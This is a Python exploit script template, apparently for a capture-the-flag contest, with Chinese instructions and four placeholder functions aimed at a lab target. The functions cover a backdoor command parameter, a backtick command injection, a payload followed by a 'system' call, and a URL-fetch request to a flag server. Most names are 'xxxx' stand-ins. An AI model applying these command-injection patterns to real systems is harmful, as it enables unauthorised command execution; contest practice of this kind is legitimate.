#!/usr/bin/env python3
"""
exp只需对漏洞进行自动化利用，并且请务必给出足够多的注释说明！！！


要求说明：
1. 函数与漏洞一一对应
2. 函数前必须写明对应的漏洞说明
3. 最后请输出漏洞利用后的结果
4. 脚本前缀"xxx"是题目名称

以下为实例，仅供参考
交付前请删除该段文字
"""
# coding=utf-8
import requests as req
import re


cmd = 'whoami' # 预设执行命令
flag_url = 'http://192.168.1.2/' # flag机的IP地址
url = 'http://192.168.1.1/' # 靶机地址
fronturl = url+'xxxx/xxxx/' # 前台路径
backurl = url+'xxxxx/wexxxxb/' # 后台路径


"""
1. 前台无限制后门
"""
def exp_1():
	url1 =fronturl+'xxx/xxx'
	payload = '?xxx='+cmd
	f = req.get(url1+payload)
	data = re.findall('<div class="xxx">-->(.*?)<div class="xxxx',f.text,flags=re.DOTALL)
	print(data[0])


"""
2. xxxx
"""
def exp_2():
	url2 = backurl + 'xxxx/xxxx?xxxx=xxxx'
	data = {
	'xxxx':'xxxx',
	'cmd':'echo `%s`;'%cmd
	}
	f = req.post(url2,data)
	data = re.findall('xxxxxxxxxxxxxxx!!!!!!!!!!!!!!(.*?)</se',f.text,flags=re.DOTALL)
	print(data[0])


"""
3. xxxx
"""
def exp_3():
	url3 = fronturl + 'xxxx/xxxx'
	f = req.get(url3,allow_redirects=False)
	payload = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
	data = {
	'xxxxxx[xxxxx][xxxx]':'xxxx',
	'xxxxxx[xxxxx][xxxx]':'xxxx',
	'xxxxxx[xxxxx][xxxx]':'xxxx',
	'xxxxxx[xxxxx][xxxx]':'xxxx',
	'xxxxxx[xxxxx][xxxx]':'xxxx',
	'xxxxxx[xxxxx][xxxx]':'xxxx',
	'xxxxxx[xxxx]':'xxxx',
	'xxxxxx[xxxx]':payload,
	'xxxxxx[xxxx]':'xxxx',
	'xxxxxx[xxxx]':'xxxx',
	'xxxxxx[xxxx]':'xxxx',
	}
	q = req.post(fronturl+'xxxx/xxxx',data,cookies=f.cookies)
	urll = fronturl+'xxxx/xxxx'
	r = req.get(urll+'?a=system&b='+cmd,cookies=f.cookies)
	print(r.content)


"""
4. xxxx
"""
def exp_4():
    # 需先登录
	backloginurl = backurl + 'xxxx/xxxx'
	data = {
	'xxxx[xxxx]':'xxxxx',
	'xxxx[xxxx]':'xxxxx'
	}
	f = req.post(backloginurl,data,allow_redirects=False)
	url4 = backurl
    # 注意请修改flag_url参数为可用的IP地址
	q = req.get(url4+'?url='+flag_url,cookies = f.cookies)
	data = re.findall('</button>(.*?)</div>',q.text,flags=re.DOTALL)
	print(data[0])


if __name__ == '__main__':
	pass
	#exp_1()
	#exp_2()
	#exp_3()
	#exp_4()